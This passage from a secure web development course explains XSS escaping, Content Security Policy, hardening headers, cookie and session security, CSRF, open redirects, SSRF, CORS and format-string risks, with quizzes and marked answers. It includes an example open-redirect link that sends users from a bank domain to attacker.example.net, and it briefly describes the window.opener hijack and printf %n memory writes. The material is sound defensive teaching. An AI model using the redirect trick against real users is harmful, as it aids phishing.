Embedded URLs must also be escaped, and the rules for escaping URLs are different. The URL syntax is generally **scheme:\[//authority]path\[?query] \[#fragment]**. For example, in the URL **<https://www.linuxfoundation.org/about/>**, the scheme is “**https**”, authority “<b>www.linuxfoundation.org</b>”, path is “**/about/**”, and this example has no query or fragment part. Sometimes you need special characters in the path, query, or fragment. The conventional way to escape those parts of the URLs is to first ensure the data is encoded with UTF-8, and escape as “**%hh**” (where **hh** is the hexadecimal representation) all bytes except for “safe” bytes, which are typically **A-Z**, **a-z**, **0-9**, “**.**”, “**-**”, “**\***”, and “**\_**”. The Java routine **java.net.URLEncoder.encode()** turns all spaces into “**+**” instead of “**%20**”; both the “**+**” and “**%20**” conventions are in wide use.

#### XSS Alternatives

You should normally use a framework that automatically escapes HTML by default.

If for some reason you can’t, you can build a wrapper that does the escaping for you and sends the output. A wrapper is riskier if it is easy to not call the wrapper. If you do use a wrapper, the wrapper should also perform the output. If you separately call an escape routine and then call to produce output, then it is especially easy to forget to call the wrapper. E.g., if you do **SendOutput(EscapeHTML(data))**, it will be far too easy to use the vulnerable **SendOutput(data)** instead.

An alternative sometimes suggested is to use very harsh input filtering that prevents all HTML metacharacters (**& < > " '**). In theory, this prevents XSS in HTML. If you *can* limit your input like this, you should do so, since you should always limit your untrusted inputs as much as possible. In practice, while harsh input filtering can help counter other attacks, it is usually *not* enough to counter XSS. The problem is that usually some inputs eventually have to allow some HTML metacharacters. For example, an O’Malley would be unhappy with a system that did not allow single quotes in a name. Even a system that starts with this limitation often outgrows it, so you cannot count on harsh input validation *by itself* to counter XSS. Yes, use harsh input validation where you can as a hardening measure - but it’s not enough to counter XSS.

A very mild hardening measure is to set the attribute **HttpOnly** on cookies. That way, if a malicious script is run, it cannot see the cookie value. You *should* set this limitation when you can, because it limits privilege, but this is a very mild hardening measure that is only useful if you apply *other* measures as well.

XSS is usually best countered by choosing a framework or library that automatically escapes output for you. However, programs often have many outputs. It would be best if we paired this solution with something else that limited the damage when a mistake *is* made. On the web there is a solution: the Content Security Policy (CSP). The next unit will discuss this.

#### Quiz 4.2: Countering Cross-Site Scripting (XSS)

\>>Choosing a framework or library that automatically escapes HTML output is often one of the best ways to counter XSS attacks. True or False?<<

(x) True

( ) False

\[Explanation]

This is true. Many web applications generate many fragments of HTML, and it is impractical to remember to manually escape every one of them. Instead, use a system that automatically escapes them. In some cases, you will need to override this, but these overrides can be carefully reviewed on each use to ensure that they are secure.

Of course, other measures can help as well, but having secure *programming* defaults means that there are usually fewer problems in the first place.

\[Explanation]

### Content Security Policy (CSP)

\[Web application]

When creating web applications, a really important tool for limiting damage is a *Content Security Policy* (CSP). If it exists, the CSP tells the receiving web browser what is allowed and not allowed from a security perspective. CSP by itself does not prevent most attacks, but can make many vulnerabilities harder to exploit or greatly reduce their impact. That makes CSP an important *defense in depth measure* to reduce risk.

Normally a reference to the CSP is sent as an HTTP header (called **Content-Security-Policy**), and like all HTTP headers, the user receives it *before* the user receives the main content. You can also send CSP information as a **\<meta>** HTML element with the **http-equiv** attribute set to **Content-Security-Policy**. However, using the **\<meta>** element is not as good as using the HTTP header, because the system has already started processing the HTML by this point. So try to use the HTTP header instead. If you have to use CSP via an HTML element, include this **\<meta>** element as soon as you can in your HTML, so that it will take effect as soon as possible.

Perhaps the most important CSP capability is that CSP can control which scripts are allowed to run. By default, a web browser runs all scripts sent to it. This is terrible if there is an XSS vulnerability, because the attack may be able to sneak code into the page and have the victim’s web browser run it. A better secure solution is to separate the code from the data and limit privilege. We can do this with CSP.

Here is a simple CSP that prevents a large number of attacks. This CSP says that resources (in particular scripts and styles) are only from the source site (**'self'**), and that **inline** or **evals** for scripts and styles are not allowed (because they have not been specifically permitted):

**Content-Security-Policy: default-src ‘self';**

The challenge with this CSP is that to use it to its full potential, we need to *stop* using inline styles and scripts. The HTML can request the *loading* of JavaScript files and CSS styles, but the JavaScript and CSS styles must be in separate files. The HTML may include lots of information important to scripts and styles (such as the **tag**, **class**, and **id**), but the HTML cannot embed scripts and styles directly.

Never using inline scripts and styles is widely considered good practice, but it is more than that; it dramatically improves security. If inline scripts and styles are ignored, then an XSS attack that subverts an HTML web page *cannot* easily cause an untrusted script or style to be used. This does not prevent all attacks, but it does prevent many, and it makes other attacks dramatically harder. If you can *stop* using all inline scripts and styles, and enforce that through your CSP, the system becomes more resistant to a range of attacks.

But what if this policy is too difficult to implement on a page, or does not meet your circumstance? That is not a problem; simply use a *different* CSP for that page. The CSP specification has a range of options that you can use to permit more operations and restrict others.

As always, your goal is least privilege: try to make the CSP as restrictive as you can. You will often get the most benefit if you modify your system so it can use a more restrictive CSP on all pages, but even a small restriction can have some benefits. Common ways to relax the limitations on scripts and styles are:

1.  Have a restrictive CSP on as many web pages as you can, such as only allowing scripts and styles from specific locations on your website (never inline). Then relax the restrictions on pages where that is currently difficult.

2.  Allow loading scripts and styles from specific other sites. You can set **default-src** (where script source files are loaded) to allow specific other websites you list. This tells the web browser that you fully trust those specific sites. Be careful; this can hurt user privacy. For example, each organization that manages those other sites will know at *least* whenever a user retrieves that information and their IP address.

3.  Allow specific hashes. You can set **default-src** to allow a specific inline program by saying that its cryptographic hash can be executed using the format **‘\<hash-algorithm>-\<base64-value>’**. This can be a useful intermediate step if you have existing inline scripts, though in the long, term it would be better to move those scripts to a separate file.

CSP has various other mechanisms to limit privileges. Another CSP parameter that is especially important is **frame-ancestors**, which is a great tool for countering clickjacking attacks. A clickjacking attack is one where an attacker can “hijack” a click that the user intended for one purpose, but in fact the click was “hijacked” to do something else. Attackers typically do this by misusing HTML’s frame capabilities. If you don’t use frames - and most sites don’t - you can easily fix this by including “**frame-ancestors ‘none';**” in your policy. If you do use frames, then use “**frame-ancestors ‘self';**” instead.

When you are developing a site it might be wise to go through the CSP specification and try to maximally limit what you ask web browsers to allow. The less you allow, the less attackers can do if you make a mistake. There are other HTTP headers that can help harden a site against attack; in the next unit we will look at a few.

#### Quiz 4.3: Content Security Policy (CSP)

\>>Using a CSP setting that forbids inline scripts, requires that JavaScript only be executed from specific trusted locations, and moving all JavaScript to separate files into those locations can reduce the impact of cross-site scripting (XSS) attacks. True or False?<<

(x) True

( ) False

\[Explanation]

This is true. CSP does not eliminate all problems, but CSP does let you forbid inline scripts and instead require JavaScript to be loaded from specific trusted locations. In this configuration, XSS attacks can no longer easily insert malicious JavaScript code, and that can reduce the impact of XSS attacks.

\[Explanation]

### Other HTTP Hardening Headers

\[Web application]

When you are delivering web pages you can limit what can be done with the results, making it harder for attackers to cause serious damage. In short, there are other HTTP headers that you can set that can sometimes harden your applications against attacks. We have already discussed the Content Security Policy (CSP), which is perhaps the most important one. Here are some other HTTP headers you should consider using:

*   **X-Content-Type-Options**<br>This should be set to **nosniff**, which means that the MIME types provided are correct and that the receiver should not try to guess what the type is. This means that attackers won’t be able to fool the web browser into using a different type.

*   **X-Frame-Options**<br>This should be set to **DENY** or **SAMEORIGIN**. Like the CSP **frame-ancestors**, this prevents the use of frames or only allows them from the origin, countering many clickjacking attacks. Technically, X-Frame-Options has been obsoleted by CSP **frame-ancestors**, but if you might have Internet Explorer (IE) users, you also need this as IE does not support CSP **frame-ancestors**.

*   **HTTP Strict-Transport-Security (HSTS)**<br>This means that *only* the secured HTTPS protocol, and not the insecure HTTP protocol, is permitted for future visits to this site for a given number of seconds. A common setting is “**Strict-Transport-Security: max-age=31536000;**” which means that *only* HTTPS will be allowed for a year (the number is the number of seconds). A larger number is fine.

If your site is publicly accessible, you can easily test your headers using the [Security Headers website](https://securityheaders.com/).

Also, an important word about HTTP headers in general. You may decide, for various reasons, to provide other HTTP headers. If some of that header information might be from an attacker, be *especially careful*. As always, do very careful input validation. There is a nasty attack, in particular, where the attacker manages to insert a newline in the input; this will cause *HTTP header splitting* in HTTP versions 1.1 and 2, where the rest of the text after the newline may be interpreted as an HTTP header provided by the attacker. This could disable many protections or even implement an attack.

#### Quiz 4.4: Other HTTP Hardening Headers

\>>When sending information using HTTP, you can set various HTTP headers (such as HTTP Strict-Transport-Security (HSTS)) to help harden your system against attack. True or False?<<

(x) True

( ) False

### Cookies & Login Sessions

\[Web application]

An important mechanism in the HTTP protocol is support for *cookies*. Cookies are small chunks of data sent from a web server to a web browser. From then on, when the web browser contacts that web server, the web browser will send that cookie value back to the server it came from, subject to certain restrictions.

#### Cookie Attributes

Web servers can also set some attributes on the cookies they send. For example:

*   Expiration time: If no expiration time is set, the cookie expires when the browser exits (such cookies are called *session cookies*). Otherwise, the browser may store the cookie permanently until the time expires (such cookies are called *permanent cookies* - a user *can* delete these cookies, but few do).

*   **Secure** flag: If set, the cookie will only be sent to HTTPS servers, and not to HTTP. You should set this whenever practical.

*   **HttpOnly** flag: The cookie is not visible to JavaScript programs. You should set this whenever practical.

*   **SameSite**: This has three main values - **None**, **Lax**, and **Strict**. “**None**” means that cookies are always sent to the matching web server. “**Lax**” means that cookies are sent if they are a **GET** (click) on a third-party website, and otherwise cookies are only sent if the request comes from the same site. “**Strict**” means that cookies are only sent in a first-party context; any request from another website will *not* cause the cookie to be sent. Historically, the web browser default was effectively **None**, but modern web browsers now act with **Lax** as the default because this counters certain attacks. We will discuss this later, but you should set this to at least **Lax** wherever practical.

#### Cookies in Context

Cookies are not, by themselves, necessarily malicious. However, cookies can reveal who the requester is in some cases, making them a potential privacy issue. This is especially true for cookies that have **SameSite=None**. If someone sets up requests for this kind of cookie on many websites (e.g., by embedding third-party images), the cookie can be used to track that user’s actions across many sites. A cookie intended to track users across websites is called a *tracking cookie*. Tracking cookies can be even worse if they have a long expiration time, because such cookies persist after the browser exits. Tracking cookies have attracted the concerns of many nations because of their detrimental effect on user privacy. As a result, various laws have passed involving cookies and consent. However, implementing tracking cookies is not the only way to use cookies; cookies can also improve security.

Cookies are important in part because they are often used to implement login sessions on the world wide web (WWW). A login session is simply a period of activity between when a user logs in and logs out. The original WWW protocol did not have a way to implement login sessions, and cookies provide a simple mechanism to support login sessions.

#### Cookies and Login Sessions

On the web, a common way to implement a login session is to have a login form. If the login is successful, the web server sends a “**session id**” within a cookie value. The session id is simply a large random number that cannot be guessed by anyone else. From then on, the web browser then sends this cookie (with the session id) whenever it contacts that web server. The web server can check this session id to see who is making the request… and if that session id is valid, the web server looks up the user id for that session and allows the user to whatever the user is authorized to do. Including a session id in a cookie is **not** the only way to use cookies to support login, but it is a common approach.

Normally, when developing web applications, you will use a framework or library that (mostly) handles login sessions for you. This is fine, just check to ensure that it is secure. Here we will cover some key features to look for. In some cases, your framework won’t do it by itself, but you can take some additional steps to make them happen.

First, if your framework uses session ids in cookies (a common approach), it is critical that the implementation does not allow attackers to guess or discover the session ids. If an attacker can get the session id, the attacker can act with the same privileges as the logged-in user! In this common case, check for these key factors at least:

1.  The session identifier must have at least 128 bits of random data.

2.  The session id must be created using a *cryptographically secure* pseudo-random number generator (CSPRNG). Anything guessable (like *“add one to the last session id”* or *“ordinary call to random()”)* is not acceptable. We will discuss this in more detail later.

3.  Encrypt session ids between the web server and web browser. The usual solution is to set the cookie’s **Secure** flag and always communicate using HTTPS (TLS).

Second, set the attributes of cookies that contain session ids to be secure:

1.  As noted earlier, where practical set cookies for login session handling with the **HttpOnly** flag. That way, JavaScript programs won’t have direct access to it. This is another example of least privilege; if a privilege is not needed, don’t provide the access.

2.  Similarly, consider using session cookies (cookies with no expiration time) for cookies that store information on login sessions. You don’t have to do this; you can use permanent cookies to store session information. But if you use permanent cookies, consider limiting the time to at most a few days. Permanent cookies are stored in permanent storage, and an attacker might be able to gain access to that stored information.

Third, make sure that you have login and logout functions, and that they actually work correctly!

Whenever a user successfully logs in, make sure that the user *always* gets a *new* session id (this is typically returned in a cookie). In particular, the receiving side of a login must *never* reuse session values. A new login means a new session is being requested (even if there is already a current session), so make sure a new session is created and used for that request! If your program fails to create a new session for a new login, it may be vulnerable to a *session fixation attack*.

🔔 Session fixation is such a common cause of security vulnerabilities that it is 2019 CWE Top 25 #37. It is [CWE-384](https://cwe.mitre.org/data/definitions/384.html).

Similarly, make *sure* that you provide users a “log off” (“sign off”) action that *actually works*. If you use session ids - a common approach - then a log off should invalidate that session. This generally means that you need to remove the record of that session id from the server database that records active session ids (and the user id each session id applies to). You also need to tell the browser to delete the cookie or at least the session id value in that cookie. That way, the user is actually logged out. Users log out to reduce their risks, but this does not work if the application does not actually log them out. A surprisingly large number of major sites have, at one time or another, not logged out users when they requested it.

You should also eventually log out an inactive session automatically. Some easy ways to do that are to not set an expiration date (so the user will log out when they shut down their browser) or set an expiration date for when the user will be logged out. Frameworks will typically let you configure this easily.

#### Quiz 4.5: Cookies & Login Sessions

\>>When a user logs in again, reuse the session id if session ids are used and already present, to reduce confusion to the user. True or False?<<

( ) True

(x) False

\[Explanation]

This is false. If a user is logging in again, they are asking for a new session. Honor that request by creating a new session!

Reusing an existing session can, in some implementations, open a system to an attack called session fixation. We have not gone into the details of session fixation in this course, but that is because the countermeasure (“don’t reuse session ids”) is much easier to explain than the attack.

\[Explanation]

### CSRF / XSRF

\[Web application]

Another kind of attack that websites have often been vulnerable to is called cross-site request forgery (CSRF or XSRF). It is less of a problem today, but it can still happen, so let’s learn what it is and how it can be countered. CSRF is also a great example of how specific security vulnerabilities can become less common over time; if you can, try to find general ways to eliminate other kinds of vulnerabilities!

In a CSRF attack, an attacker tricks the user into sending data to a *server*, where the server interprets the request as a request from the user and directly acts on it. For example, the attacker could create a form with a submit button on the attacker’s website, but tell the user’s web browser to submit the completed form to a server that will act on that form. Note that if the user is logged in to that server (say for a bank), the server will see that the user really is logged in to the bank, and might be convinced to do something the user did not intend (such as transfer a lot of money to the attacker).

In some ways, a CSRF attack is the opposite of an XSS attack. XSS exploits the user’s trust in a server; CSRF exploits the server’s trust in a client (that the user is actually intentionally making a given request). Put another way: XSS fools clients; CSRF fools servers.

A common countermeasure used today in most widely-used web application frameworks is to send a secret user-specific CSRF token in all forms and any other URLs with side-effects, and then check to ensure that the correct secret is included with any request with a side-effect. Since attackers will not know the secret value, the attacker cannot insert a matching CSRF token. Since this is built into almost all widely-used web frameworks today, many applications are automatically protected from CSRF (unless they disable the protection or don't use the framework correctly). You should prefer a web application framework that has a CSRF token mechanism.

Another common countermeasure used today is what are called **SameSite** cookies. Historically, all cookies were sent to a server whenever the user had matching cookies for that server, even when the primary page being displayed was from a different server. For example, a web page on site BB might include a reference to an image on site CC; when the web browser downloaded the image from CC it would send all related cookies. However, this does not really make much sense; in many cases cookies should not be sent if the interaction was caused by an unrelated server. So modern browsers have an optional **SameSite** setting on cookies. If the setting is **Lax** or **Strict**,  a request caused by an attacker on a different server will not cause the cookie (like a session) to be sent. So as long as your session cookies have a **SameSite** setting of **Lax** or **Strict**, CSRF attacks generally don’t work. Even better, modern browsers are working to make **SameSite=Lax** the default. It is best to set **SameSite** to **Lax** or **Strict** yourself, but a secure default is still a good thing.

In short, CSRF vulnerabilities are becoming less common because the industry is moving towards safe defaults. This shows it is *possible* to reduce the likelihood of entire classes of vulnerabilities by designing or modifying systems so that the default is secure. Where possible, build countermeasures into your tools/standards/system so the problem won’t occur. If you are building a new web application, it is much less likely to be a problem, but make sure that your web framework counters it and that you use its mechanisms correctly.

🔔 Although it’s becoming less common, Cross-Site Request Forgery (CSRF) is still a common enough cause of security vulnerabilities that it is 2019 CWE Top 25 #9. It is also identified as [CWE-352](https://cwe.mitre.org/data/definitions/352.html). It used to be in the OWASP Top 10. It is not in the 2017 edition, because so many modern frameworks now prevent it, but it is still important if your software is vulnerable to it.

Of course, there are other ways an attacker might be able to gain temporary control over a user’s system. So you might still want to implement some other traditional CSRF countermeasures, such as:

1.  Automatically log off users after some period of time, or some time of inactivity.

2.  If an action is especially dangerous (e.g., account deletion or moving a large sum of money), require a separate additional authenticated confirmation that the user really is requesting it. This is good anyway, because there are many ways an attacker might be able to temporarily gain control over an account; limiting the impact is all part of managing risk.

#### Quiz 4.6: CSRF / XSRF

\>>CSRF vulnerabilities are less common today because web application frameworks and web browsers generally have countermeasures to make these vulnerabilities less likely. True or False?<<

(x) True

( ) False

\[Explanation]

This is true! This shows that sometimes it *is* possible to modify systems to reduce the likelihood of whole classes of attacks. You should also continuously look for ways to eliminate entire classes of attacks, either in your specific application or the world in general.

\[Explanation]

### Open Redirects and Forwards

\[Web application]

A web application should not accept user-controlled input that specifies a link to some site on a different server and then, without strict controls, use that link to do a redirect. A web application that does this has an *open redirect*.

This can be hard to understand, so let’s look at an example. Let’s imagine that a server-side web application has a “**/redirect**” link that accepts a parameter **url=**, and then simply redirects requests to the **url= value**. That means that an attacker could create an HTML file anywhere that looks like this (the example is based on text in MITRE’s text on [CWE-601](https://cwe.mitre.org/data/definitions/601.html)):

<b>\<a href="https://bank.example.com/redirect?url=https://attacker.example.net">Click here to log in\</a></b>

What is the problem? The problem is that a user who checked the link would think that this link went to a trusted domain (e.g., **bank.example.com**). While technically that is true, when clicked, the supposedly trusted domain will quietly redirect the user to some other domain that might be dangerous and not what the user expected (e.g., **attacker.example.net**). More generally, the problem is that an open redirect can be used to fool humans and create stronger phishing attacks. Humans can be lulled into thinking they are going to a trusted domain, without realizing that they will in fact be immediately transferred to an untrusted domain. In theory, the users should also check *where they are now* on each page, but busy humans often don’t do that. We want to make it harder, not easier, to fool busy humans.

A related problem is a “forward”, where the web application forwards the request to some other part of the web application. The web application might incorrectly view the request as an *internal* request from the web application itself, instead of more accurately coming from an external user, and give it unwarranted privileges.

The [OWASP cheat sheet on unvalidated redirects and forwards](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html) discusses various possible countermeasures:

*   *“Simply avoid using redirects and forwards.*

*   *If used, do not allow the URL as user input for the destination.*

*   *Where possible, have the user provide \[a] short name, ID or token which is mapped server-side to a full target URL.*

    *   *This provides the highest degree of protection against the attack tampering with the URL.*

    *   *Be careful that this doesn’t introduce an enumeration vulnerability where a user could cycle through IDs to find all possible redirect targets*

*   *If user input can’t be avoided, ensure that the supplied value is valid, appropriate for the application, and is authorized for the user.*

*   *Sanitize input by creating a list of trusted URLs (lists of hosts or a regex).*

    *   *This should be based on an allowlist approach, rather than a denylist.”*

🔔 Open redirects are such a common cause of security vulnerabilities that this weakness is 2021 CWE Top 25 #37 and 2019 CWE Top 25 #32. It is [CWE-601](https://cwe.mitre.org/data/definitions/601.html).

#### Quiz 4.7: Open Redirects and Forwards

\>>It is fine to support a redirector URL, e.g., **<https://bank.example.com/redirect?url=https://dangerous.example.com>**, as long as the URL is carefully sanitized to only allow trusted URLs. True or False?<<

(x) True

( ) False

\[Explanation]

This is true! The problem is not redirection, it is *unvalidated* redirection. Of course, if you don’t allow redirection at all, that is even safer, but at the very least it is important to validate the redirection to ensure that it is a value you expect.

\[Explanation]

### HTML **target** and JavaScript **window.open()**

\[Web application]

There is a peculiar problem with the HTML **target** attribute that many people are not aware of. Let’s explain the problem, and some partial solutions.

In HTML, **\<a href=...>** creates a hyperlink. The HTML construct **\<a href=... target=...>** creates a hyperlink where, if you click on it, it creates a new “target”. The default value for target is **\_self**; if you set **target**, a common one is **target="\_blank”** which creates the target in a new tab.

But what many don’t realize is that a value of “**target**” other than the default “**\_self**” may, in some cases, create a vulnerability. Because of the way it works, the page being linked to runs in the *same* process as the calling page. As a result, on a click the receiving page gains partial control over the linking page, *even if they are from different origins*. The primary way this happens is through the **window.opener** value. The receiving page can do things like force the *calling* page to navigate to a different page (e.g., **window.opener.location.href = newURL**), provide a new page that looks like the old one (even though it is in a different place), and fool the user into doing something on the “same” page that is not the same at all. A related problem is that the new page may also get “referrer” information that you might not have expected.

The same kind of problem can happen in JavaScript. JavaScript’s “**window.open**” has a default target of “**\_blank**”; since that is not “**\_self**”, the *default value* of **window.open()** is insecure. Again, it will open a window that loads another page that is simultaneously given control over its calling page, *even if* they have different origins.

Of course, if you can trust that other page, that is not a security problem. So using a target value is often not a problem as long as you are referring to your *own* site. But if you are referring to another site, this may be more of a concern - are you sure you can trust it? Even if you trust your own or another site, it might be unwise to allow this - what happens if someone breaks into that part or that other site? Again, there is the principle of least privilege - we don’t want to give privileges if we don’t need to. This can also be a minor performance problem; page performance may suffer due to use of a shared process.

The simplest solution is to avoid using **target=...** in HTML, and always set **target="\_self"** when calling JavaScript **window.open()...** especially for links to user-generated content and external domains. If you decide to use HTML **target=**, also use **rel="noopener noreferrer"**. The “**noopener**” tells the web browser to *not* allow the JavaScript to gain control over the referring window (so **window.opener** won’t give access to it). The ”**noreferrer**” prevents passing on the referrer information to the new tab/window ([*Security Vulnerability and Browser Performance Impact of Target=”\_blank”*](https://medium.com/@darrensimio/security-vulnerability-and-browser-performance-impact-of-target-blank-80e5e67db547) by Darren Sim, 2019).

#### Quiz 4.8: HTML **target** and JavaScript **window.open()**

\>>In an HTML anchor (**\<a href=...>**) to another site, if you use **target=...** with a value other than **\_self**, be sure to also set “**rel**” to “**noopener noreferrer**” prevent control by that other site of the originating tab. True or False?<<

(x) True

( ) False

\[Explanation]

This is true! Yes, this is a weird and subtle point. There is reason to hope that future developments in HTML and JavaScript will close this unexpected security hole, but for now, it is important to know about it.

\[Explanation]

### Using Inadequately Checked URLs / Server-Side Request Forgery (SSRF)

A Uniform Resource Locator (URL) is a way to refer to a specific web resource by location. Technically, a URL is a specific type of Uniform Resource Identifier (URI), but for our purposes we will use the terms interchangeably. As specified in [IETF RFC 3986](https://tools.ietf.org/html/rfc3986), a generic URI has this syntax:

**scheme:\[//authority]path\[?query] \[#fragment]**

And **authority** has this syntax:

**\[userinfo@]host\[:port]**

Sometimes untrusted users will give you data that you want to use as a URL (or turn into a URL) to request more information. However, this can be dangerous. If you include a URL in data you present to a user, they might do the equivalent of clicking on it. It turns out that URLs are powerful things, and an attacker might try to exploit any of their capabilities. For example:

*   A URL need not use the **https:** scheme; it might have other schemes like **file:** (to retrieve a local file) or even relatively obscure schemes like **gopher:**.  One sneaky attack is to request one scheme (like “**gopher:**”) to a service that expects a completely different protocol; an attacker may be able to use this confusion to produce an attack.

*   The “host” might not be what you expect; the host might refer to an arbitrary other computer or even the requesting computer.

*   An attacker might provide **userinfo** (a user account name) and/or a port. The port, for example, allows a URL to request a connection on *any* port of a computer.

*   A URL can even encode a variety of characters for any of this data.

If a server is fooled into requesting an inadequately checked URL, it is called a *server-side request forgery* (SSRF).

The main solution is to ensure that you greatly limit how you construct any URLs that you request. If possible, don’t use untrusted data to create these URLs. If you must use untrusted data to construct a URL (and this often occurs), maximally limit the URLs that can be constructed and ensure that only *safe* URLs can be constructed. For example, in many cases today you can limit the URL to a single scheme (**https:**), and there is usually no need to allow (for example) ports or usernames.

🔔 Server-Side Request Forgery (SSRF) is such a common cause of security vulnerabilities that it is 2021 OWASP Top 10 #10, 2021 CWE Top 25 #24, and 2019 CWE Top 25 #30. It is [CWE-918](https://cwe.mitre.org/data/definitions/918.html).

#### Quiz 4.9: Using Inadequately Checked URLs / Server-Side Request Forgery (SSRF)

\>>URLs are merely ways to locate information, so validating them is not important. True or False?<<

( ) True

(x) False

\[Explanation]

Not at all! If possible, don’t use untrusted data to create these URLs. If you must (and you often must), maximally limit the URLs that can be constructed and ensure that only *safe* URLs can be constructed.

\[Explanation]

### Same-Origin Policy and Cross-Origin Resource Sharing (CORS)

\[Web Application]

When a web browser gets an HTML file, the HTML file is allowed to freely refer to images, videos, CSS stylesheets, and scripts to run. Normally the web browser will attempt to retrieve and use them, regardless of what website those materials come from.

However, when a web browser retrieves and runs a script (such as JavaScript), it would be dangerous for the web browser to allow that script to easily interact with arbitrary websites. If that were allowed, a malicious script could surreptitiously send private data to any other site, and the script could also attack other websites (e.g., by exploiting vulnerabilities or launching a DDoS attack).

To prevent many security problems, web browsers normally enforce on client-side JavaScript programs a set of rules called the *same-origin policy*. Under the same-origin policy, client-side JavaScript programs are only allowed to interact with the same *origin*, including viewing any resources. The origin of a URL is the combination of the protocol (usually https), port (443 by default for https), and host. Thus, **<https://example.com/foo>** and **<https://example.com/bar>** are considered to have the same origin because they have the combination (https, 443, example.com). The purpose of the same-origin policy is to isolate potentially malicious documents (Mozilla, [*Same-Origin Policy*](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)).

The same-origin policy prevents many security issues, but it is sometimes too strict. A website can specifically allow interaction by JavaScript from other origins by using Cross-Origin Resource Sharing (CORS). CORS can be useful, since it relaxes the restrictions of the same-origin policy. CORS can also be a problem, since CORS can enable vulnerabilities if it is poorly used. CORS is specified in great detail in the [WHATWG Fetch specification](https://fetch.spec.whatwg.org/#http-extensions). Mozilla has a nice description of CORS in their [documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS). In this unit, we will briefly cover the highlights, summarizing some of the material from the Mozilla CORS documentation.

In brief: CORS allows web servers to declare what other origins are allowed access to what resources (URLs), and which HTTP verbs (**GET**, **POST**, **DELETE**, etc.) are permitted to those other origins. Web browsers request this information and use it to determine if client-side JavaScript programs are allowed to make a cross-origin request (that is, an action outside their origin). This information is exchanged using new HTTP headers that are output by the web browser and web server. CORS requests are used for cross-origin **XMLHttpRequest** and **Fetch** requests (among other circumstances).

There are two kinds of CORS requests, a (so-called) *simple request* and a *preflighted request*. This is an optimization. Simple requests use a single interaction, while successful preflighted requests use two interactions. Any CORS request that cannot be done with a simple request is automatically implemented by the web browser with a preflighted request. Preflighted requests have more latency than a simple request, so where you *can*, write your client-side code so it will use CORS simple requests. Sometimes that is not possible, and then a higher-latency preflighted request will automatically be used.

A CORS simple request is used when *all* of the following are true:

*   The requested method is **GET**, **HEAD**, or **POST**

*   The request headers are only the ones automatically set by the web browser (aka user agent), optionally extended with *CORS-safelisted request-headers*. Examples of these safelisted headers are **Accept**, **Accept-Language**, **Content-Language**, **Viewport-Width**, and **Width**.

*   The **Content-Type** header is one of: **application/x-www-form-urlencoded**, **multipart/form-data**, or **text/plain**.

*   A few other requirements are also met. See the specification for details; in most cases these other requirements will be met.

When a CORS simple request is made, the web browser makes the request as usual and also sets the HTTP header **Origin** to the script origin. The web server then determines if that request is acceptable. The web server then replies and sets the HTTP header **Access-Control-Allow-Origin** with information about the allowed origin(s). If that value is “**\***”, then *any* origin is allowed that access. The web browser looks at the **Access-Control-Allow-Origin**, and if the requesting origin matches, the script receives any information returned.

A preflighted request, unlike a simple request, uses an extra step. In a preflighted request, the web browser first sends an **OPTIONS** request with the **Origin** and other information, to ask the web server if the actual request is “*safe to send*”. If the web server approves it, then the actual request is sent. Some browsers do not follow redirects for a preflighted request; see the [Mozilla CORS documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) for solutions if it matters to you.

By default, browsers will not send credentials (cookies and HTTP Authentication information) in a CORS request. However, a specific flag can be set on an  **XMLHttpRequest** object or **Request** constructor to send credentials. If this is done, the web server must return **Access-Control-Allow-Credentials: true** or the JavaScript program will not receive the results. Web servers should be very cautious about using this; if it is used at all, be very picky about the origins allowed. It is much safer to *not* use **Access-Control-Allow-Credentials**, as this allows credentialed programmatic control from a different origin.

If you intend for some information to be publicly readable on your web server, and it never varies (no matter who requested it or where it is from), consider returning “**Access-Control-Allow-Origin: \***” when a web browser tries to **GET** that information. This allows client-side JavaScript programs to directly retrieve that information and use it further. That does allow JavaScript programs to repeatedly request it, so in theory that makes DDoS attacks slightly easier. However, for many websites the goal is to distribute some information, and DDoS can be countered in other ways.

Sometimes the information may vary depending on the origin of the requestor (this is true if you set an **Access-Control-Allow-Origin** to any value other than “**\***”). In these cases, ensure that you include a “**Vary**” header with the value “**Origin**”. This “**Vary**” value tells the web browser that the result may vary depending on the origin, preventing information from one origin from leaking into another origin (or lack of origin) via CORS.

Details on how to enable CORS for a large variety of circumstances is available at [enable-cors.org](https://enable-cors.org/). You can also check out the following resources for more details:

*   [Web Hypertext Application Technology Working Group (WHATWG).](https://fetch.spec.whatwg.org/)[*Fetch*](https://fetch.spec.whatwg.org/)

*   [Mozilla’s](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)[*Same-origin policy*](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)[documentation](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)

*   [Mozilla’s Cross-Origin Resource Sharing (CORS) documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS).

### Format Strings and Templates

Producing results can be complicated. Almost all programming languages have special mechanisms to make output easier; even the original 1956 version of FORTRAN did ([*The FORTRAN Automatic Coding System for IBM 704 EDPM: Programmer’s Reference Manual*](https://archive.computerhistory.org/resources/text/Fortran/102649787.05.01.acc.pdf), 1956)! These mechanisms include various kinds of format string and template systems. These mechanisms can be very powerful and speed development. They can also be critical for countering vulnerabilities; one of the best ways to counter the Cross-Site Scripting (XSS) attacks is to use a templating system that counters it by default, as we have already discussed.

However, *be very careful* about letting untrusted users control the output formats (that is, using format strings and templates from untrusted users). In many cases, you should *not* let untrusted users set output formats that are used by general-purpose templating systems without carefully validating them first. Some output format systems can execute arbitrary code, or reveal information beyond a specific set of approved values - and you *definitely* should not allow that in most cases! Even when they cannot run *arbitrary* code, by definition they control the output, and they may be able to create misleading results or results that overwhelm wherever the output goes.

The C programming language output routines are especially dangerous, because their design assumes that the format string parameters are from trusted sources. For example, the **printf()** family of routines (including **fprintf** and **snprintf**) takes a *format string* parameter; if an attacker can control the format string, then the attacker can trivially make the result arbitrarily long (often leading to a buffer overflow), print any memory area (revealing confidential information or data that enables a security bypass), or use the **%n** operation to overwrite arbitrary memory areas. The same is true for **syslog()** (which writes system log information) and **setproctitle()** (which sets the string used to display process identifier information). Many functions with names beginning with “**err**” or “**warn**”, containing “**log**”, or ending in “**printf**” are worth reviewing.

